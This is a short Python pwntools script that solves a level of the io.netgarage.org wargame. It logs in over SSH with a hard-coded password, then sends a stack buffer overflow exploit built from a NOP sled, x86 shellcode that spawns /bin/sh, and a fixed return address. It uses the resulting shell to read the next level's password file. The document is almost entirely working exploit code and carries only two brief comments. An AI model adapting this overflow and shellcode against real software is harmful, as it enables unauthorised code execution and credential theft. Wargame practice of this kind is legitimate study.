from pwn import *
s = ssh(user='level5', host='io.netgarage.org', password='fQ8W8YlSBJBWKV2R', port=22)
# game at http://io.netgarage.org/
# a simple buffer overflow with code redirection to shellcode
exploit = b'/levels/level05 '
exploit += b'$(python -c \"print \'\\x90\' * 117 +'
exploit += b'\'\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80'
exploit += b'\\xe3\\xfd\\xff\\xbf\'\")'
# sh.sendline(exploit)
sh = s.run(exploit)
for i in range(1):
    print(sh.recvline(timeout=2))
sh.sendline(b'cat /home/level6/.pass')
log.info('Password : '+sh.recvline(timeout=2).decode('utf-8')[7:])
s.close()
